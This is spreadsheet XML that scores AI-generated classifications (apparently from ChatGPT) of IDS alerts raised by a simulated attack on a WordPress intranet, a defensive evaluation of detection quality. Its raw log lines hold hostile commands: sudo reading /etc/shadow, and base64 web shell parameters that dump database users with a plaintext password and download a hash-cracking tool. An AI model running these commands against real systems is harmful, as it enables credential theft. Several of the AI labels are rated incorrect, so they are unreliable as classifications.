            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Attempt to access forbidden file or directory.”,</text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/html/”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Scanning not represented</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Service Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Application Attack, </text:p>
            <text:p>Reconnaissance, </text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “GET /nmaplowercheck1642508249 HTTP/1.1 403 3260 - "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)”, “POST /sdk HTTP/1.1 403 363 - Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name in log line nmap and the 403 error code</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Correct &amp; expressive</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Service Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Application Attack, </text:p>
            <text:p>Reconnaissance, </text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Attempt to access forbidden file or directory.”,</text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/html/nmaplowercheck1642508249”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name nmap and IDS classification </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Correct &amp; expressive</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>WPScan</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="12" calcext:value-type="float">
            <text:p>12</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Application Attack, </text:p>
            <text:p>Reconnaissance, </text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”, mitre – technique: “Vulnerability Scanning”, id: “T1595.002”, tactic: “Reconnaissance”,</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/change-wp-admin-login/ HTTP/1.1 404 146 https://intranet.price.fox.org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3"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>WPScan</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Application Attack, </text:p>
            <text:p>Reconnaissance, </text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”, mitre – technique: “Vulnerability Scanning”, id: “T1595.002”, tactic: “Reconnaissance”</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/constant-contact-form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Web Application Attack, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”, </text:p>
            <text:p>Raw Data: “GET /academics HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDS description</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</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Attack, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”, mitre – technique: “Vulnerability Scanning”, id: “T1595.002”, tactic: “Reconnaissance”</text:p>
            <text:p>Raw Data: “GET /accountants HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDS description</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>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Web Application Attack, </text:p>
            <text:p>Reconnaissance, </text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”, mitre – technique: “Vulnerability Scanning”, id: “T1595.002”, tactic: “Reconnaissance” </text:p>
            <text:p>Raw Data: “GET /bea HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on the mitre IDS classification</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Correct &amp; expressive</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Dirb</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="6" calcext:value-type="float">
            <text:p>6</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Application Attack, </text:p>
            <text:p>Reconnaissance, </text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”, </text:p>
            <text:p>Raw Data: “GET /wp-admin/user/webcalendar HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Correct &amp; expressive</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>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Web Application Attack, </text:p>
            <text:p>Access Denied, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Attempt to access forbidden file or directory.”, </text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/plugins/.htpasswd_”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Scanning not represented</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Password Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Anomaly, </text:p>
            <text:p>Protocol Anomaly, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Suricata: Alert - SURICATA HTTP unable to match response to request”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name suricata</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Password Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="8" calcext:value-type="float">
            <text:p>8</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Anomaly, </text:p>
            <text:p>Protocol Anomaly</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid handshake message”, “SURICATA TLS invalid record/traffic”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name suricata</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>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Credential Access,</text:p>
            <text:p>Password Guessing</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “PAM: User login failed.”, mitre – technique: “Password Guessing”, id: “T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based on PAM authentication failrue</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Defense Evasion</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use of su</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4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Privilege Escalation,</text:p>
            <text:p>Defense Evasion</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use of su and PAM session</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Correct &amp; expressive</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">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 </text:p>
            <text:p>Defense Evasion, </text:p>
            <text:p>Discovery</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tool name sudo and use of root</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Correct &amp; expressive</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">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Credential Access, Collection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Successful sudo to ROOT executed.”, mitre – technique: “Sudo and Sudo Caching”, id: “T1548.003”, tactic: “Privilege Escalation”, “Defense Evasion”, Raw Data: “intranet-server sudo: phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/cat /etc/shadow”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name sudo</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Correct &amp; expressive</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell/>
          <table:table-cell table:formula="of:=SUM([.B2:.B25])" office:value-type="float" office:value="72" calcext:value-type="float">
            <text:p>72</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="7"/>
        </table:table-row>
      </table:table>
      <table:table table:name="TP_aminer_chatgpt_run4" table:style-name="ta1">
        <table:table-column table:style-name="co39" table:default-cell-style-name="Default"/>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33" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co1" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co43"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Initial Access, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Unusual occurrence frequencies of query records in DNS logs.”, “Frequency anomaly detected.”,</text:p>
            <text:p>Raw Data: “dnsmasq[14522]: query[A] mail.price.fox.org from [IP]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>The data exfiltration attack is not really about Initial Access or Reconnaissance</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Credential Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “taylorcruz-mail dovecot: imap-login: Disconnected (no auth attempts in 0 secs)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Scanning not represented</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Initial Access,  </text:p>
            <text:p>Reconnaissance</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The classifications are both really general</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Misuse, </text:p>
            <text:p>Encryption Downgrade Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “TLS error on connection from [IP] (gnutls_handshake): An unexpected TLS packet was received.”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>While the classification is in line with the alert it is not what it is labelled a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Active Scanning, </text:p>
            <text:p>Web Application Fingerprinting</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /nmaplowercheck1642508249 HTTP/1.1 403 363 - Mozilla/5.0 (compatible; Nmap Scripting Engine; <text:a xlink:href="https://nmap.org/book/nse.html" xlink:type="simple">https://nmap.org/book/nse.html</text:a>)”</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Active Scanning, </text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “POST /sdk HTTP/1.1 403 3260 - Mozilla/5.0 (compatible; Nmap Scripting Engine; <text:a xlink:href="https://nmap.org/book/nse.html" xlink:type="simple">https://nmap.org/book/nse.html</text:a>)”</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Active Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET / HTTP/1.0 403 363"</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool 403 http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 </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Scanning</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Application Exploitation Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”, </text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/html/HNAP1”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>The classification does not tell anything about the attack</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Directory Enumeration</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based on the attempted access to root web directory that was denie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ning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/plugins/akismet/ HTTP/1.1 403 3362 <text:a xlink:href="https://intranet.price.fox.org/" xlink:type="simple">https://intranet.price.fox.org</text:a> WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on tool name WPScan and 403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Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/analytics-for-wp/ HTTP/1.1 404 146 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on tool name WPScan and 404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9" calcext:value-type="float">
            <text:p>9</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Application Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/animated-typing-effect/ HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (<text:a xlink:href="https://wpscan.com/wordpress-security-scanner" xlink:type="simple">https://wpscan.com/wordpress-security-scanner</text:a>)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on tool name WPScan and 404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Exploitation for Client Execution, </text:p>
            <text:p>Web Application Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “HEAD /wp-content/themes/ecobiz/thumb/timthumb.php HTTP/1.1 404 146 <text:a xlink:href="https://intranet.price.fox.org/" xlink:type="simple">https://intranet.price.fox.org</text:a> WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on tool name WPScan and access to timthumb.php (that has been used for remote code execution on WordPress theme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Credential Access, </text:p>
            <text:p>Sensitive File Discovery</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based on http code and file that was accesse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Credential Access, </text:p>
            <text:p>Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /javascript/jquery/.htpasswd_ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Scanning not represented, too general</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Web Application Fuzzing</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce6"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based on special characters and 404 http cod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itial Access, </text:p>
            <text:p>Exploit Public-Facing Application</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ccess to info.php and usage of script function</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Incorrec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scovery, </text:p>
            <text:p>System Information Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-includes/sitemaps/phpinfo.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on access to phpinfo.php and usage of script function</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Fuzzing, </text:p>
            <text:p>Privilege Escalation</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”, </text:p>
            <text:p>Raw Data: “GET /wp-includes/js/thickbox/~webmaster HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on access to ~webmaster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rectory Traversal, </text:p>
            <text:p>Web Application Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/thickbox/~www HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on special characters and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Directory Enumeration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”, </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ccess to directory with default index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itial Access, </text:p>
            <text:p>Access Control Bypass</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ccess to directory with default index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Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”, </text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/langs HTTP/1.1 301 515 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on the access to a non-existent directory and the 301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Application Scanning, </text:p>
            <text:p>Fuzzing</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/lost+found HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on special characters and http code; as well as tool name Apach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Exploit Attempt, </text:p>
            <text:p>Information Gathering</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Scanning not represented</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Exploitation Attempt, </text:p>
            <text:p>File Inclusion / Traversal</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/includes/classes/index.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Exploitation Attempt is not expressiv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Scanning,</text:p>
            <text:p>Resource Enumeration</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ccessing of the non-existing file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Application Scanning, </text:p>
            <text:p>Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/includes/classes/phpinfo.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on accessing of the non-existing but common file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Attempt to Restricted Resource</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/plugins/hr/ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on 403 status code and attempted access of sensitive plugin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Directory Enumeration, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/images/admin/~logs HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on enumeration of /admin/ directory and 404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Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/images/admin/lost+found HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on special characters and 404 http cod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Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,  </text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/images/admin/phpinfo.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on usage of script function and access to .php file in /admin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Reconnaissance,</text:p>
            <text:p>Access Control Evasion</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403 status code and attempted access to common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Reconnaissance,</text:p>
            <text:p>File / Directory Enumeration</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403 status code and attempted access of common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  </text:p>
            <text:p>File / Directory Enumeration</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403 status code and access to .htpasswd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Web Reconnaissance, </text:p>
            <text:p>Fuzzing</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/js/admin/@ HTTP/1.1\\\" 404 363 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on 404 status code and special characters in file path</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Credential Access, </text:p>
            <text:p>Defense Evasion</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ccess to /admin/.htacces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Credential Access</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ccess to /admin/.htaccess</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text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type”, “New path(es) detected”, </text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htpasswd”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on access to /admin/.htaccess</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itial Access, </text:p>
            <text:p>Exploration</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ccess to sensitive file adminphp</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</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Execution, </text:p>
            <text:p>Command and Control</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”,</text:p>
            <text:p>Raw Data: “/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name apache, and high entropy string because of base64 encoding</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</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Command and Control</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”, </text:p>
            <text:p>Raw Data: “/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name apache, and high entropy string because of base64 encoding</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Command and Control, </text:p>
            <text:p>Exfiltration</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Line looks like web shell lines, however the base64 string decoded indicated password cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Incorrec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Command and Control,</text:p>
            <text:p>Persistence</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”,</text:p>
            <text:p>Raw Data: “POST /services/ajax.php/imp/poll HTTP/1.1 200 463 <text:a xlink:href="https://mailserver.taylorcruz.fox.org/imp/dynamic.php?page=mailbox" xlink:type="simple">https://mailserver.taylorcruz.fox.org/imp/dynamic.php?page=mailbox</text:a> Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on frequency of requests</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Incorrec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Impact, </text:p>
            <text:p>Resource Hijacking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “CPU value deviates from average in monitoring logs.”, “Statistical data report”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on CPU usage valu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Command and Control</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based on frequency of reques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Reverse Shell</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Shell Upload,</text:p>
            <text:p>Command Execution</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”,</text:p>
